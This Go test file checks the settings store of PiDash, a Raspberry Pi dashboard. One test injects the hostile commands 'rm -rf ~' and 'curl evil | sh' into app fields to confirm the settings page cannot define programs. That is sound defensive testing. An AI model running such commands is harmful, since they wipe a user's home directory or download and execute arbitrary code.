package settings

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/DarioRomano/PiDash/internal/config"
)

// base imitates a config.toml with the shipped YouTube and Netflix apps, one
// hand-written program, and port 8080.
func base() config.Config {
	cfg := config.Default()
	cfg.Apps = []config.App{
		{ID: "youtube", Name: "YouTube", URL: "https://www.youtube.com/tv", Browser: "firefox", AdBlock: true, UserAgent: youTubeTV},
		{ID: "netflix", Name: "Netflix", URL: "https://www.netflix.com/browse"},
		{ID: "retro", Name: "RetroArch", Command: "retroarch --fullscreen"},
	}
	if err := cfg.Finish(); err != nil {
		panic(err)
	}
	return cfg
}

func open(t *testing.T) (*Store, string) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "pidash", "settings.json")
	s, err := Open(path, base())
	if err != nil {
		t.Fatal(err)
	}
	return s, path
}

func TestWithoutSettingsFileTheConfigFileRules(t *testing.T) {
	s, _ := open(t)
	cfg, err := s.Effective()
	if err != nil || len(cfg.Apps) != 3 || cfg.Weather.Enabled() || cfg.Server.Listen != ":8080" {
		t.Fatalf("cfg = %+v, err %v", cfg.Apps, err)
	}
	v := s.View()
	kinds := []string{}
	for _, a := range v.Apps {
		kinds = append(kinds, a.Kind+":"+a.ID)
	}
	if got, want := strings.Join(kinds, " "), "preset:youtube preset:netflix file:retro"; got != want {
		t.Errorf("apps on the page = %s, want %s", got, want)
	}
	if v.Apps[2].Detail != "retroarch --fullscreen" || len(v.Presets) < 5 {
		t.Errorf("view = %+v", v.Apps[2])
	}
}

func TestSavingWeatherAndSynology(t *testing.T) {
	s, path := open(t)
	err := s.Save(Update{
		Weather: &Weather{Location: " Zurich ", Units: "metric"},
		Photos: &Photos{Source: "synology", IntervalSeconds: 45,
			Synology: Synology{URL: "http://nas.local:5000/", Username: "pidash", Password: "s3cret", Quality: "preview"}},
	})
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := s.Effective()
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Weather.Location != "Zurich" || !cfg.Weather.Enabled() {
		t.Errorf("weather = %+v", cfg.Weather)
	}
	p := cfg.Photos
	if p.Source != "synology" || p.Interval.Duration.Seconds() != 45 || p.Synology.URL != "http://nas.local:5000" || p.Synology.Password != "s3cret" || p.Synology.Quality != "preview" {
		t.Errorf("photos = %+v", p)
	}

	// The page is never given the password back, and the file is private.
	if b, _ := json.Marshal(s.View()); strings.Contains(string(b), "s3cret") {
		t.Error("the settings view contains the NAS password")
	}
	if !s.View().Photos.Synology.PasswordSet {
		t.Error("the view should say that a password is stored")
	}
	if fi, err := os.Stat(path); err != nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("settings.json mode = %v, err %v; want 0600", fi.Mode().Perm(), err)
	}

	// Saving again with an empty password keeps the stored one.
	err = s.Save(Update{Photos: &Photos{Source: "synology", IntervalSeconds: 60,
		Synology: Synology{URL: "http://nas.local:5000", Username: "pidash", Quality: "original"}}})
	if err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s.Effective(); cfg.Photos.Synology.Password != "s3cret" || cfg.Photos.Interval.Duration.Seconds() != 60 {
		t.Errorf("password was lost or interval not updated: %+v", cfg.Photos)
	}

	// It all survives a restart.
	s2, err := Open(path, base())
	if err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s2.Effective(); cfg.Weather.Location != "Zurich" || cfg.Photos.Synology.Username != "pidash" {
		t.Errorf("after reopening: %+v", cfg.Weather)
	}
}

func TestInvalidSettingsAreRefusedAndNothingIsWritten(t *testing.T) {
	s, path := open(t)
	cases := map[string]Update{
		"synology without login": {Photos: &Photos{Source: "synology", Synology: Synology{URL: "http://nas:5000", Quality: "original"}}},
		"bad NAS address":        {Photos: &Photos{Source: "synology", Synology: Synology{URL: "nas", Username: "a", Password: "b", Quality: "original"}}},
		"bad units":              {Weather: &Weather{Location: "Zurich", Units: "kelvin"}},
		"website without name":   {Apps: &[]App{{Kind: KindWeb, URL: "https://example.com"}}},
		"website bad address":    {Apps: &[]App{{Kind: KindWeb, Name: "X", URL: "example.com"}}},
		"unknown preset":         {Apps: &[]App{{Kind: KindPreset, Preset: "doom"}}},
		"preset missing address": {Apps: &[]App{{Kind: KindPreset, Preset: "synology-photos"}}},
		"unknown kind":           {Apps: &[]App{{Kind: "command", Name: "x"}}},
	}
	for name, u := range cases {
		if err := s.Save(u); err == nil {
			t.Errorf("%s: expected an error", name)
		}
	}
	if _, err := os.Stat(path); err == nil {
		t.Error("a refused update must not create settings.json")
	}
}

func TestAppsFromTheSettingsPage(t *testing.T) {
	s, _ := open(t)
	err := s.Save(Update{Apps: &[]App{
		{Kind: KindPreset, Preset: "netflix"},
		{Kind: KindPreset, Preset: "synology-photos", Name: "Photos", URL: "http://nas.local:5000/?launchApp=SYNO.Foto.AppInstance"},
		{Kind: KindPreset, Preset: "moonlight"},
		{Kind: KindWeb, Name: "ARD Mediathek!", URL: "https://www.ardmediathek.de/", AdBlock: true},
		{Kind: KindWeb, Name: "ARD Mediathek", URL: "https://example.org/"},
		{Kind: KindFile, ID: "retro"},
	}})
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := s.Effective()
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, a := range cfg.Apps {
		got = append(got, a.ID)
	}
	want := "netflix synology-photos moonlight ard-mediathek ard-mediathek-2 retro"
	if strings.Join(got, " ") != want {
		t.Fatalf("apps = %v, want %s", got, want)
	}
	if a := cfg.Apps[1]; a.Name != "Photos" || !strings.Contains(a.URL, "SYNO.Foto") {
		t.Errorf("synology photos = %+v", a)
	}
	if a := cfg.Apps[2]; a.Command != "moonlight-qt" || a.Mode != config.AppModeConsole {
		t.Errorf("moonlight = %+v", a)
	}
	if a := cfg.Apps[3]; a.Browser != config.BrowserFirefox || !a.AdBlock {
		t.Errorf("the ad blocker should switch the site to Firefox: %+v", a)
	}
	// A program from config.toml keeps its exact command; YouTube was removed.
	if a := cfg.Apps[5]; a.Command != "retroarch --fullscreen" {
		t.Errorf("retro = %+v", a)
	}
}

func TestTheSettingsPageCannotDefineCommands(t *testing.T) {
	s, _ := open(t)
	// Whatever is sent, a command only ever comes from a preset or config.toml.
	raw := `{"apps":[{"kind":"web","name":"Evil","url":"https://example.com","command":"rm -rf ~"},
	                 {"kind":"file","id":"nonexistent","command":"curl evil | sh"}]}`
	var u Update
	if err := json.Unmarshal([]byte(raw), &u); err != nil {
		t.Fatal(err)
	}
	if err := s.Save(u); err == nil {
		t.Fatal("a reference to a program that is not in config.toml must be refused")
	}
	u.Apps = &[]App{(*u.Apps)[0]}
	if err := s.Save(u); err != nil {
		t.Fatal(err)
	}
	cfg, _ := s.Effective()
	if cfg.Apps[0].Command != "" || cfg.Apps[0].URL != "https://example.com" {
		t.Errorf("a command slipped through: %+v", cfg.Apps[0])
	}
}

func TestPortIsRememberedOnlyWhileTheConfigFileStillAsksForTheTakenOne(t *testing.T) {
	s, path := open(t)
	if err := s.RememberPort(":8080", ":8081"); err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s.Effective(); cfg.Server.Listen != ":8081" {
		t.Errorf("listen = %s, want the remembered :8081", cfg.Server.Listen)
	}
	// The person now picks a port in config.toml: that wins.
	changed := base()
	changed.Server.Listen = ":9000"
	s2, _ := Open(path, changed)
	if cfg, _ := s2.Effective(); cfg.Server.Listen != ":9000" {
		t.Errorf("listen = %s, want :9000 from config.toml", cfg.Server.Listen)
	}
}

func TestDamagedSettingsFileIsIgnored(t *testing.T) {
	path := filepath.Join(t.TempDir(), "settings.json")
	os.WriteFile(path, []byte("{ not json"), 0o600)
	s, err := Open(path, base())
	if err == nil || !strings.Contains(err.Error(), "damaged") {
		t.Errorf("err = %v", err)
	}
	if cfg, err := s.Effective(); err != nil || len(cfg.Apps) != 3 {
		t.Errorf("PiDash should run on config.toml alone: %v", err)
	}
}
